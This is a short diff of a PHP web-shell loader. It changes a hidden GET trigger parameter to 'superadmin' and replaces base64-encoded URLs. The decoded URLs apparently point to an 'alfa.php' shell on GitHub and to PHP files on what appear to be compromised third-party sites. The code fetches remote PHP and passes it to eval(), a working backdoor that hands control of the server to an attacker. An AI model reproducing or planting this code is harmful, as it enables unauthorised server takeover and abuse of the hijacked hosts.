@@ -22,10 +22,10 @@ function get_data($url) {
 
 $x = '?>';
 
-if (isset($_GET['kontol'])) {
-    $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi9hbGZhMS5waHA=');
+if (isset($_GET['superadmin'])) {
+    $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi9hbGZhLnBocA==');
 } else {
-    $target_url = base64_decode('aHR0cHM6Ly90ZWdhbHJlam8uc2FsYXRpZ2EuZ28uaWQvd3AtaW5jbHVkZXMvaW1hZ2VzL2NyeXN0YWwvLS8=');
+    $target_url = base64_decode('aHR0cHM6Ly9kaWdpbGliLml0ay5hYy5pZC9zaW1iaW8yL3NpbWJpb19EQi9wZ3NxbC9jYWNoZS1ydW50aW1lLnBocA==');
 }
 
 eval($x . get_data($target_url));
